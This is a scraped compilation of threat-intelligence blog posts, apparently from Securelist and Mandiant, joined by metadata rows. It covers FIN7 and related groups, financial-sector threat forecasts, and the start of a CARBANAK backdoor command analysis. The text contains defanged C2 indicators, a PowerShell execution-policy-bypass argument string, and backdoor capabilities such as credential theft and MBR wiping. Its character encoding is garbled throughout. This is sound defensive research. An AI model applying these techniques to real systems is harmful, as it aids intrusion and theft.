testing.html This company seems to have been used by the FIN7 threat actor to hire new people as translators, developers and pentesters. During our research, we found various job advertisements associated with the company on freelance and remote-work websites. In addition to that, various individuals have mentioned the company in their resumes. We believe that some of these https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 6 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 individuals may not even be aware that they are working for a cybercrime business. Links to other intrusion sets While tracking numerous threat actors on a daily basis during the !nal days of 2018 and at the beginning of 2019, we discovered various activity clusters sharing certain TTPs associated with the FIN7 intrusion set. The link between these threat actors and FIN7 is still weak, but we decided to disclose a few hints regarding these in this blog post. CobaltGoblin/EmpireMonkey In his history, FIN7 has overlapped several times with Cobalt/EmpireMonkey in terms of TTPs. This activity cluster, which Kaspersky Lab has followed for a few years, uses various implants for targeting mainly banks, and developers of banking and money processing software solutions. At the end of 2018, the cluster started to use not only CobaltStrike but also Powershell Empire in order to gain a foothold on the victims’ networks. After a successful penetration, it uses its own backdoors and the CobaltStrike framework or Powershell Empire components to hop to interesting parts of the network, where it can monetize its access. FIN7’s last campaigns were targeting banks in Europe and Central America. This threat actor stole stealing €13 million from Bank of Valetta, Malta earlier this suspected of year. Example of malicious documents used in the end of 2018 to beginning of 2019 FROM THE SAME AUTHORS Cybersecurity of connected healthcare 2020: Overview and predictions Cyberthreats to !nancial institutions 2020: Overview and predictions Cyberthreats to !nancial institutions 2019: overview and predictions https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 7 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 and predictions Cybercriminals vs !nancial institutions in 2018: what to expect Kaspersky Security Bulletin 2015. Evolution of cyber threats in the corporate sector A few interesting overlaps in recent FIN7 campaigns: Both used macros to copy wscript.exe to another !le, which began with “ms” (mses.exe – FIN7, msutil.exe – EmpireMonkey). Both executed a JScript !le named “error” in %TEMP% (Errors.txt in the case of FIN7, Errors.bat for EmpireMonkey). Both used DocuSign decoy documents with di""erent macros. The macros popped the same “Document decryption error” error message—even if macro code remain totally di""erent. We have a high level of con!dence in a historic association between FIN7 and Cobalt, even though we believe that these two clusters of activity are operated by di""erent teams. AveMaria AveMaria is a new botnet, whose !rst version we found in September 2018, right after the arrests of the FIN7 members. We have medium con!dence that this botnet falls under the FIN7 umbrella. In fact, AveMaria is a classic infostealer bot that collects all possible credentials from various types of software: browsers, email clients, messengers, etc., and can act as a keylogger. Since the beginning of 2019, we have collected more than 1300 samples and extracted more than 130 C2s. To deliver their malware, the cyber criminals use spearphishing emails with various types of attachments: MS O""ice documents or spreadsheet !les exploiting some known vulnerability like CVE-2017-11882, or documents with Ole2Link and SCT. They also use AutoIT droppers, password-protected EXE !les and even ISO images. What is interesting, in some emails, they ask targets to phone them if they have any questions, like the FIN7 guys do. https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 8 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 Example of AveMaria spearphing emails. Criminals suggest calling them. During the investigation into FIN7, our threat-hunting systems found an interesting overlap in between the infrastructure of FIN7 and AveMaria. Basically, two servers in the same IP range and AS14576 (autonomous system) share a non-standard SSH port, which is 222. One of the servers is a Gri""on C2, and the other one, an AveMaria C2. Distribution of targets is another factor suggesting that these two malware families may be connected. We analyzed AveMaria targets during February and March of 2019. The spearphishing emails were sent to various kinds of businesses only and did not target individuals. Thirty percent of the targets were small and medium-sized companies that were suppliers or service providers for bigger players and 21% were various types of manufacturing companies. We also spotted several typical FIN7 targets, such as retailers and hotels. Most AveMaria targets (72%) were in the EU. https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 9 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 CopyPaste At the end of 2018, while searching for new FIN7 campaigns via telemetry, we discovered a set of activity that we temporarily called “CopyPaste” from a previously unknown APT. Interestingly, this actor targeted !nancial entities and companies in one African country, which lead us to think that CopyPaste was associated with cybermercenaries or a training center. This set of activity relied on open-source tools, such as Powershell Empire, and well-documented red teaming techniques, in order to get a foothold within the victim’s networks and avoid detection. Here are the main similarities between CopyPaste and FIN7: Both used the same Microsoft PowerShell argument obfuscation order: “powershell.exe -NoP -NonI - ExecutionPolicy Bypass”. We have only seen FIN7 and CopyPaste use this argument list for executing their malicious Powershell Scripts. Both used decoy 302 HTTP redirections and typosquatting on their C2s (reminiscent of Cobalt and FIN7). The Empire C2s associated with CopyPaste had decoy redirections to Digitcert and Microsoft websites and used decoy job employment and tax websites with decoy redirections to host their payloads. FIN7 and Cobalt used decoy 302 HTTP redirections too, FIN7 on its GRIFFON C2s before January 2018, and Cobalt, on its staging servers, similar to CopyPaste. Quite recently, FIN7 threat actors typosquatted the brand “Digicert” using the domain name digicert- cdn[.]com, which is used as a command and control server for their GRIFFON implants. CopyPaste, in turn, also typosquatted this brand with their domains digicertweb[.]com and digi-cert[.]org, both used as a Powershell Empire C2 with decoy HTTP 302 redirects to the legitimate Digicert website. The links between CopyPaste and FIN7 are still very weak. It is possible that the CopyPaste operators were https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 10 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 Subscribe to our weekly e-mails The hottest research right in your inbox Email(Required) I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I !nd at the bottom of any e-mail sent to me for the purposes mentioned above. Subscribe in$uenced by open-source publications and do not have any ties with FIN7. Conclusions During 2018, Europol and DoJ announced the arrest of the leader of the FIN7 and Carbanak/CobaltGoblin cybercrime groups. It was believed that the arrest of the group leader will have an impact on the group’s operations. However, recent data seems to indicate that the attacks have continued without signi!cant drawbacks. One may say CobaltGoblin and FIN7 have even extended the number of groups operating under their umbrella. We observe, with various level of con!dence, that there are several interconnected groups using very similar toolkits and the same infrastructure to conduct their cyberattacks. The !rst of them is the well-known FIN7, which specializes in attacking various companies to get access to !nancial data or PoS infrastructure. They rely on a Gri""on JS backdoor and Cobalt/Meterpreter, and in recent attacks, Powershell Empire. The second one is CobaltGoblin/Carbanak/EmpireMonkey, which uses the same toolkit, techniques and similar infrastructure but targets only !nancial institutions and associated software/services providers. We link the AveMaria botnet to these two groups with medium con!dence: AveMaria’s targets are mostly suppliers for big companies, and the way AveMaria manages its infrastructure is very similar to FIN7. The last piece is the newly discovered CopyPaste group, who targeted !nancial entities and companies in one African country, which lead us to think that CopyPaste was associated with cybermercenaries or a training center. The links between CopyPaste and FIN7 are still very weak. It is possible that the operators of this cluster of activity were in$uenced by open-source publications and do not have any ties with FIN7. All of the aforementioned groups greatly bene!t from unpatched systems in corporate environments. They thus continue to use e""ective spearphishing campaigns in https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 11 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 conjunction with well-known MS O""ice exploits generated by the framework. So far, the groups have not used any zero-days. FIN7/Cobalt phishing documents may seem basic, but when combined with their extensive social engineering and focused targeting, they are quite successful. As with their previous fake company “Combi Security”, we are con!dent that they continue to create new personas for use in either targeting or recruiting under a “new” brand, “IPC”. More information about these and related attacks is available to customers of Kaspersky Intelligence Reports. Contact: intelreports@kaspersky.com Indicators of compromise AveMaria 185.61.138.249 tain.warzonedns[.]com noreply377.ddns[.]net 185.162.131.97 91.192.100.62 server.mtcc[.]me doddy!re.dyndns[.]org 212.8.240.116 168.167.45.162 toekie.ddns[.]net warmaha.warzonedns[.]com CopyPaste digi-cert[.]org somtelnetworks[.]com geotrusts[.]com https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 12 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 secureclientupdate[.]com digicertweb[.]com sport-pesa[.]org itaxkenya[.]com businessdailyafrica[.]net infotrak-research[.]com nairobiwired[.]com k-24tv[.]com FIN7/GRIFFON hpservice-cdn[.]com realtek-cdn[.]com logitech-cdn[.]com pci-cdn[.]com appleservice-cdn[.]com servicebing-cdn[.]com cisco-cdn[.]com facebook77-cdn[.]com yahooservices-cdn[.]com globaltech-cdn[.]com infosys-cdn[.]com google-services-s5[.]com instagram-cdn[.]com mse-cdn[.]com akamaiservice-cdn[.]com booking-cdn[.]com live-cdn2[.]com cloud$are-cdn-r5[.]com cdnj-cloud$are[.]com bing-cdn[.]com https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 13 di 17 FIN7.5: the infamous cybercrime rig “FIN7” continues its activities | Securelist 05/09/24, 11:49 servicebing-cdn[.]com cdn-yahooapi[.]com cdn-googleapi[.]com googl-analytic[.]com mse-cdn[.]com tw32-cdn[.]com gmail-cdn3[.]com digicert-cdn[.]com vmware-cdn[.]com exchange-cdn[.]com cdn-skype[.]com Search... windowsupdatemicrosoft[.]com msdn-cdn[.]com testing-cdn[.]com msdn-update[.]com EmpireMonkey/CobaltGoblin In order to preserve the privacy of the potential victims, we stripped the targeted entities from the domain names. (entity)-corporate[.]com (entity)-cert[.]com (entity)-no[.]org (entity)-fr[.]org (entity)-acquisition[.]org (entity)-trust[.]org riscomponents[.]pw nlscdn[.]com IN THE SAME CATEGORY Subscribe BlindEagle ""ying high in Latin America EastWind campaign: new CloudSorcerer attacks on government organizations in Russia APT trends report Q2 2024 CloudSorcerer – A new APT targeting Russian https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/ Pagina 14 di 17"
fin7,cti-hal,6c79385a6f97,G0046,"Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 Content menu Search... Subscribe Cyberthreats to !nancial institutions 2020: Overview and predictions KASPERSKY SECURITY BULLETIN 03 DEC 2019 12 minute read KSB WEBINARS 02 FEB 2021, 12:00PM 2021 predictions, episode 1: !nancial cyberthreats ANCHISES MORAES, OLAF SCHWARZ 04 FEB 2021, 12:00PM 2021 predictions, episode 2: healthcare cyberthreats MARIA NAMESTNIKOVA // AUTHORS YURY NAMESTNIKOV DMITRY BESTUZHEV 11 FEB 2021, 12:00PM 2021 predictions, episode 3: ICS Kaspersky Security Bulletin 2019. Advanced threat predictions for 2020 cyberthreats EVGENY GONCHAROV Cybersecurity of connected healthcare 2020: Overview and predictions 5G technology predictions 2020 Corporate security prediction 2020 Key events 2019 Large-scale anti-fraud bypass: Genesis digital !ngerprints market uncovered Multi-factor authentication (MFA) and biometric challenges 26 JAN 2021, 12:00PM Kaspersky’s Advanced Targeted Threat Predictions For 2021 ARIEL JUNGHEIT, COSTIN RAIU, DAVID EMM 25 JAN 2021, 12:00PM Remote working in 2020: lessons learnt DMITRY GALOV https://securelist.com/financial-predictions-2020/95388/ Pagina 1 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 Targeted attack groups specializing in !nancial institutions: splitting and globalization ATM malware becomes more targeted Card info theft and reuse: magecarting everywhere and battle of POS malware families in Latin America Large-scale anti-fraud bypass: Genesis digital !ngerprints market uncovered During the last few years, cybercriminals have invested a lot in methods to bypass anti-fraud systems, because now it’s not enough just to steal the login, password and PII – they now need a digital !ngerprint to bypass anti-fraud systems in order to extract money from the bank. During 2019, we identi!ed a huge underground market called Genesis, which sells digital !ngerprints of online banking users from around the globe. From an anti-fraud system perspective, the user’s digital identity is a digital !ngerprint – a combination of system attributes that are unique to each device, and the personal behavioral attributes of the user. It includes the IP address (external and local), screen information (screen resolution, window size), !rmware version, operating system version, browser plugins installed, time zone, device ID, battery information, fonts, etc. The device may have over 100 attributes used for browsing. The second part of a digital identity is the behavioral analysis. As criminals are continuously looking for ways to defeat anti-fraud safeguards, they try to substitute the system’s real !ngerprint with a fake one, or with existing ones stolen from someone else’s PC. The Genesis Store is an online invitation-only private cybercriminal market for stolen digital !ngerprints. At the time of our research, it o""ered more than 60 thousand stolen bot pro!les. The pro!les include browser !ngerprints, website user logins and passwords, cookies, credit card information, etc. By uploading this !ngerprint https://securelist.com/financial-predictions-2020/95388/ Pagina 2 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 to the Tenebris Linken Sphere browser, criminals are able to masquerade as legitimate online banking users from any region, country, state, city, etc. This type of attack shows that criminals have in-depth knowledge of how internal banking systems work and it’s a real challenge to protect against such attacks. The best option is to always use multi-factor authentication. Multi-factor authentication (MFA) and biometric challenges MFA is a challenge for cybercriminals. When MFA is used, they have to come up with techniques to bypass it. The most common methods used during the last year were: Exploiting vulnerabilities and #aws in the con!guration of the system. For example, criminals were able to !nd and exploit several #aws in remote banking systems to bypass OTPs (one time passcodes); Using social engineering, a common method among Russian-speaking cybercriminals and in APAC region; SIM swapping, which is especially popular in regions like Latin America and Africa. In fact, despite SMS no longer being considered a secure 2FA, low operational costs mean it’s the most popular method used by providers. In theory, biometrics should solve a lot of problems associated with two-factor authentication, but practice has shown that it may not be so simple. Over the past year, several cases have been identi!ed that indicate biometrics technology is still far from perfect. Firstly, there are quite a few implementation problems. For example, Google Pixel 4 does not check if your eyes are open during the unlocking process using facial characteristics. Another example is the possibility of bypassing !ngerprint authentication using the sensor under the screen on smartphones made by various manufacturers, including popular brands such as Samsung. https://securelist.com/financial-predictions-2020/95388/ Pagina 3 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 There is another trick that has been exploited in Latin America: a visual capturing attack. Cybercriminals installed rogue CCTV cameras and used them to record the PINs people used to unlock their phones. Such a simple technique is still very e""ective for both types of victims: those who use biometrics and those who prefer PINs to !ngerprints or facial recognition. This is because, when a device is dusty or greasy (and the same applies to a user’s !ngers), the best way to unlock a phone is to use a PIN. Secondly, there were several high-pro!le leaks of biometric databases. The most notorious was the leak of the Biostar 2 database that included the biometric data of over 1 million people. The company stored unencrypted data, including names, passwords, home addresses, email addresses and, most importantly, unencrypted biometric data that included !ngerprints and facial recognition patterns as well as the actual photos of faces. A similar leak occurred at a US Customs and Border Patrol contractor, where biometric information of over 100,000 people was leaked. There have already been several proof-of-concept attacks that use biometric data to bypass security controls, but those attacks could still be countered with system updates. With these latest leaks, on the other hand, this won’t work because your biometric data cannot be changed – it stays with you forever. The cases mentioned above, combined with the high- quality research carried out by cybercriminals to obtain a complete digital !ngerprint of a user in order to bypass anti-fraud systems, suggest that relying solely on biometric data will not solve the current problems. Today’s implementations need a lot of e""ort and more research to make them truly secure. Targeted attack groups specializing in !nancial institutions: splitting and globalization FROM THE SAME AUTHORS Cyberthreats to !nancial organizations in 2022 Targeted ransomware: it’s not just about encrypting your data! AZORult spreads as a fake ProtonVPN installer Cybersecurity of connected healthcare 2020: Overview and predictions FIN7.5: the infamous cybercrime rig “FIN7” continues its activities https://securelist.com/financial-predictions-2020/95388/ Pagina 4 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 FIN7 In 2018, Europol and the US Department of Justice announced the arrest of the leader of the FIN7 and Carbanak/CobaltGoblin cybercrime groups. Some believed that the arrest would have an impact on the group’s operations, but this does not seem to have been the case. In fact, the number of groups operating under the umbrella of CobaltGoblin and FIN7 has grown: there are several interconnected groups using very similar toolkits and the same infrastructure to conduct their cyberattacks. The !rst operating under this umbrella is the now- notorious FIN7 that specializes in attacking various companies to get access to !nancial data or their PoS infrastructure. It relies on the Gri""on JScript backdoor and Cobalt/Meterpreter and, in more recent attacks, PowerShell Empire. The second is CobaltGoblin/Carbanak/EmpireMonkey. It uses the same toolkit, techniques and a similar infrastructure, but targets only !nancial institutions and associated software and service providers. The !nal group is the newly discovered CopyPaste group, which has targeted !nancial entities and companies in one African country – leading us to believe that this group is associated with cyber-mercenaries or a training center. The links between CopyPaste and FIN7 are still very weak. It’s possible that the operators of this cluster of activity were in#uenced by open-source publications and don’t actually have any ties to FIN7. All of these groups bene!t greatly from unpatched systems in corporate environments and continue to use e""ective spear-phishing campaigns in conjunction with well-known Microsoft O""ice exploits generated by their exploitation framework. So far, the groups have not used any zero-day exploits. FIN7/Cobalt phishing documents may seem basic, but when combined with their extensive social engineering and focused targeting, they have proved to be quite successful. https://securelist.com/financial-predictions-2020/95388/ Pagina 5 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 In the middle of 2019, FIN7 fell silent, but returned at the end of the year with new attacks and new tools. We suspect that the silent period is connected to their infrastructure shutdown that occurred after closing a bulletproof hosting company in Eastern Europe. In contrast to FIN7, the activity of the Cobalt Goblin Group was stable throughout the year, which once again proves that these groups are connected, but operate on their own: their toolsets and TTPs are very similar, but operate independently; and only occasionally can we spot overlaps in infrastructure. At the same time, the intensity of attacks is slightly lower than in 2018. Cobalt Goblin’s tactics have remained the same: they use documents with exploits that !rst load a small downloader and then a Cobalt beacon. The main targets also remain the same: small banks in a variety of countries. Perhaps we have detected a lower number of attacks due to diversi!cation, because some indicators suggest the group could also be engaging in JS sni""ing (MageCarting) in order to obtain data about payment cards directly from websites. JS sni""ing was extremely popular throughout the year and we found thousands of e-commerce websites infected with these scripts. The injected scripts act in di""erent ways and the infrastructure of the attackers is very di""erent, which suggests that this type of fraud is used by at least a dozen cybercrime groups. The Silence group actively expanded its operations into di""erent countries throughout the year. We detected attacks in regions where we have never seen them before. For example, we recorded attacks in Southeast Asia and Latin America. This indicates that they have either expanded their operations themselves or started cooperating with other regionally installed cybercrime groups. However, when we look at the development of their main backdoor, we see that their technologies have barely changed over the last two years. ATM malware becomes more targeted When it came to ATM malware, we discovered a number of https://securelist.com/financial-predictions-2020/95388/ Pagina 6 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 completely new families in 2019. The most notable were ATMJadi and ATMDtrack. ATMJadi is an interesting one because it doesn’t use the standard XFS, JXFS or CSC libraries. Instead, it uses the victim bank’s ATM software Java proprietary classes: meaning the malware will only work on a small subset of ATMs. It makes this malware very targeted (towards one speci!c bank). This is reminiscent of the FASTcach case from 2018, when criminals targeted servers running AIX OS. With a decrease in the number of general-purpose cashout tools, we can say that ATM malware is becoming rarer and more targeted. Another interesting piece of malware is ATMDtrack, which was !rst detected in !nancial institutions in India and is programmed to cash out ATMs. Using the Kaspersky Targeted Attack Attribution Engine (KTAE), we were able to attribute these attacks to the Lazarus group, which supports our prediction from 2018 that there will be “more nation-state sponsored attacks against !nancial organizations“. Moreover, similar spyware has been found in research centers, with Lazarus APT group using almost identical tools to steal research results from scienti!c institutes. Card info theft and reuse During the year we saw a lot of malware targeting end users and businesses looking for credit card data. In Brazil, in particular, we saw a couple of malware families !ghting it out between themselves to maintain control of infected devices. HydraPOS and ShieldPOS were very active during the year, with new versions that included a lot of new targets; Prilex, meanwhile, reduced its activities in the second half of the year. ShieldPOS has been active since at least 2017 and, after being malware only, it has !nally evolved into a MaaS (malware-as-a-service). This fact shows there’s great interest from Latin American cybercriminals in running Subscribe to our weekly e-mails The hottest research right in your inbox Email(Required) I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I !nd at the bottom of any e-mail sent to me for the purposes mentioned above. Subscribe https://securelist.com/financial-predictions-2020/95388/ Pagina 7 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 their own “business” to steal credit cards. HydraPOS has been mostly focused on stealing money from POS systems in restaurants, parking slot machines and di""erent retail stores. Compared to ShieldPOS, HydraPOS is an older campaign from an actor we named Maggler, which has been in the credit card business since at least 2016. The main di""erence is that, unlike ShieldPOS, it doesn’t work as MaaS. In both cases, we suspect that the initial infection vector is a carefully prepared social engineering campaign involving telephone calls to the victims. Analysis of forecasts for 2019 Before giving our forecasts for 2020, let’s see how accurate our forecasts for 2019 turned out to be: The emergence of new groups due to the fragmentation of Cobalt/Carbanak and FIN7: new groups and new geography. Yes, we saw CobaltGoblin activity, FIN7 activity, CopyPaste activity and the intersection of IoCs and the Silence group. The !rst attacks through the theft and use of biometric data. Yes, hacking of various biometric data databases regularly appeared throughout the year. We also revealed a digital !ngerprint market where criminals can buy digital !ngerprints, which includes, among other things, behavioral data (component of biometrics). The emergence of new local groups attacking !nancial institutions in the Indo-Pakistan region, Southeast Asia and Central Europe. No. It turned out that well-known groups such as Lazarus, Silence and CobaltGoblin took their place and very actively attacked !nancial institutions in these https://securelist.com/financial-predictions-2020/95388/ Pagina 8 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 regions. Continuation of supply-chain attacks: attacks on small companies that provide their services to !nancial institutions around the world. Yes. Traditional cybercrime will focus on the easiest targets and bypass anti-fraud solutions: replacement of POS attacks with attacks on systems accepting online payments (Magecarting/JS skimming). Yes, the number of groups that started carrying out attacks on online payment systems grew constantly over the year. We detected thousands of websites that were a""ected by JS skimming. The cybersecurity systems of !nancial institutions will be bypassed using physical devices connected to the internal network. Yes, and not only in !nancial institutions but even the aerospace industry, namely NASA, has su""ered from this type of attack. Attacks on mobile banking for business users. No. Advanced social engineering campaigns targeting operators, secretaries and other internal employees in charge of wire transfers. Yes, BEC (business email compromise) attacks have been on the rise worldwide. We have seen major attacks in Japan, while there have also been campaigns in South America, particularly in Ecuador. Additionally, advanced social attacks have been actively used in Brazil to make POS operators go to a malicious website to download specially crafted remote control modules and run them, for example, in HydraPOS attacks. https://securelist.com/financial-predictions-2020/95388/ Pagina 9 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 Forecast 2020 Attacks against Libra and TON/Gram The successful launch of cryptocurrencies such as Libra and Gram might lead to the worldwide spread of this type of asset, which naturally will attract the attention of criminals. Given the serious surge in cybercriminal activity during the rapid growth of Bitcoin and altcoins in 2018, we predict that a similar situation will most likely unfold around Gram and Libra. Large players in this market should be especially careful, as there are a number of APT groups, such as WildNeutron and Lazarus, whose interests include crypto assets. They are very likely to exploit these developments. Reselling bank access During 2019, we witnessed cases where groups who specialize in targeted attacks on !nancial institutions appeared in the victims’ networks after intrusions by other groups that specialize in selling rdp/vnc access, such as FXMSP and TA505. These facts are also con!rmed by underground forums and chat monitoring. In 2020, we expect an increase in the activity of groups specializing in the sale of network access in the African and Asian regions, as well as in Eastern Europe. Their prime targets are small banks, as well as !nancial organizations recently bought by big players who are rebuilding their cybersecurity system in accordance with the standards of their parent companies. Ransomware attacks against banks This forecast logically follows from the previous one. As mentioned above, small !nancial institutions often become the victims of opportunistic cybercriminals. If these criminals cannot resell access, or even if it becomes less likely that they will be able to withdraw money, then the most logical monetization of such access is IN THE SAME CATEGORY ICS and OT threat predictions for 2024 Privacy predictions for 2024 Dark web threats and dark market predictions for 2024 Story of the year: the impact of AI on cybersecurity Kaspersky Security Bulletin 2023. Statistics https://securelist.com/financial-predictions-2020/95388/ Pagina 10 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 ransomware. Banks are among those organizations that are more likely to pay a ransom than accept the loss of data, so we expect the number of such targeted ransomware attacks to continue to rise in 2020. Another ransomware attack vector against small and medium !nancial institutions will be a “pay-per-install” scheme. Traditional botnets will eventually turn into increasingly popular delivery mechanisms against those !nancial institutions. 2020: the return of custom tooling Measures taken by antivirus products to e""ectively detect open source tools used for pen testing purposes, and the adoption of the latest cyberdefense technologies, will push cybercrime actors to return to custom tooling in 2020 and also invest in new Trojans and exploits. Global expansion of mobile banking Trojans: result of leaked source Our research and monitoring of underground forums suggests that the source code of some popular mobile banking Trojans was leaked into the public domain. Given the popularity of such Trojans, we expect a repeat of the situation when the source code of ZeuS and SpyEye Trojans were leaked: the number of attempts to attack users will increase at times, and the geography of attacks will expand to almost every country in the world. Investment apps on the rise: new target for criminals Mobile investment apps are becoming more popular among users around the globe. This trend won’t go unnoticed by cybercriminals in 2020. Given the popularity of some !ntech companies and exchanges (for both real and virtual money), cybercriminals will realize that not all of them are prepared to deal with massive cyberattacks, as some apps still lack basic protection for customer accounts, and do not o""er two-factor authentication or https://securelist.com/financial-predictions-2020/95388/ Pagina 11 di 16 Cyberthreats to financial institutions 2020: Overview and predictions | Securelist 03/09/24, 16:47 certi!cate pinning to protect app communication. Several governments are deregulating this area and new players are appearing every day, becoming popular very quickly. In fact, we have already seen attempts by cybercriminals to substitute the interfaces of these apps with their own malicious versions. Magecarting 3.0: even more attacker groups and cloud apps to become prime targets Over the past couple of years, JS skimming has gained immense popularity among attackers. Unfortunately, cybercriminals now have a huge attack surface that consists of vulnerable e-commerce websites and extremely cheap JS skimmer tools available for sale on various forums, starting at $200. At the moment we are able to distinguish at least 10 di""erent actors involved in these types of attacks and we believe that their number will continue to grow during the next year. The most dangerous attacks will be on companies that provide services such as e-commerce as a service, which will lead to the compromise of thousands of companies. Political instability leading to the spread of cybercrime in speci!c regions Some countries are experiencing political and social upheaval, resulting in masses of people seeking refugee status in other countries. These waves of immigration include all sorts of people, including cybercriminals. This phenomenon will result in the spread of geographically localized attacks in countries that have not previously been a""ected by them. https://securelist.com/financial-predictions-2020/95388/ Pagina 12 di 16"
fin7,cti-hal,a5e835374064,G0046,"Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 Threat Intelligence Behind the CARBANAK Backdoor June 12, 2017 Mandiant Wri!en by: James T. Benne!, Barry Vengerik In this blog, we will take a closer look at the powe""ul, versatile backdoor known as CARBANAK (aka Anunak). Speci#cally, we will focus on the operational details of its use over the past few years, including its con#guration, the minor variations observed from sample to sample, and its evolution. With these details, we will then draw some conclusions about the operators of https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 1 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 CARBANAK. For some additional background on the CARBANAK backdoor, see the papers by Kaspersky and Group-IB and Fox-It. Technical Analysis Before we dive into the meat of this blog, a brief technical analysis of the backdoor is necessary to provide some context. CARBANAK is a full-featured backdoor with data-stealing capabilities and a plugin architecture. Some of its capabilities include key logging, desktop video capture, VNC, HTTP form grabbing, #le system management, #le transfer, TCP tunneling, HTTP proxy, OS destruction, POS and Outlook data the$ and reverse shell. Most of these data-stealing capabilities were present in the oldest variants of CARBANAK that we have seen and some were added over time. Monitoring Threads The backdoor may optionally sta% one or more threads that pe""orm continuous monitoring for various purposes, as described in Table 1. Thread https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 2 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 Name Description Logs key strokes for Key con#gured processes and logger sends them to the command and control (C2) server Form grabber Monitors HTTP tra'c for form data and sends it to the C2 server POS monitor Monitors for changes to logs stored in C:\NSB\Coalition\Logs and nsb.pos.client.log and sends parsed data to the C2 server Searches recursively for newly created Outlook PST personal storage table (PST) monitor #les within user directories and sends them to the C2 server HTTP proxy Monitors HTTP tra'c for requests sent to HTTP proxies, saves the proxy monitor address and credentials for future use Table 1: Monitoring threads https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 3 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 Commands In addition to its #le management capabilities, this data-stealing backdoor suppo%s 34 commands that can be received from the C2 server. A$er decryption, these 34 commands are plain text with parameters that are space delimited much like a command line. The command and parameter names are hashed before being compared by the binary, making it di'cult to recover the original names of commands and parameters. Table 2 lists these commands. Command Command Hash Name Description 0x0AA37987 loadcon#g 0x007AA8A5 state Runs each command speci#ed in the con#guration #le (see the Con#guration section). Updates the state value (see the Con#guration https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 4 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 0x007CFABF video 0x06E533C4 download 0x00684509 ammyy section). Desktop video recording Downloads executable and injects into new process Ammyy Admin tool 0x07C6A8A5 update Updates self 0x0B22A5A7 0x0B77F949 h!pproxy 0x07203363 killos Add/Update klgcon#g (analysis incomplete) Sta%s HTTP proxy Renders computer unbootable by wiping the MBR https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 5 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 0x078B9664 reboot 0x07BC54BC tunnel Reboots the operating system Creates a network tunnel Adds new C2 server or proxy 0x07B40571 adminka address for pseudo- HTTP protocol Adds new C2 server for custom binary protocol Creates or deletes Windows user account Enables concurrent RDP (analysis incomplete) 0x079C9CC2 server 0x0007C9C2 user 0x000078B0 rdp https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 6 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 0x079BAC85 secure 0x00006ABC del 0x0A89AF94 sta%cmd 0x079C53BD runmem Adds Noti#cation Package (analysis incomplete) Deletes #le or service Adds command to the con#guration #le (see the Con#guration section) Downloads executable and injects directly into new process Send Windows 0x0F4C3903 logonpasswords accounts details to the C2 server Takes a screenshot https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 7 di 27 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 10/09/24, 11:26 0x0BC205E4 screenshot 0x007A2BC0 sleep of the desktop and sends it to the C2 server Backdoor sleeps until speci#ed date 0x0006BC6C dupl Unknown 0x04ACAFC3 0x00007D43 vnc 0x09C4D055 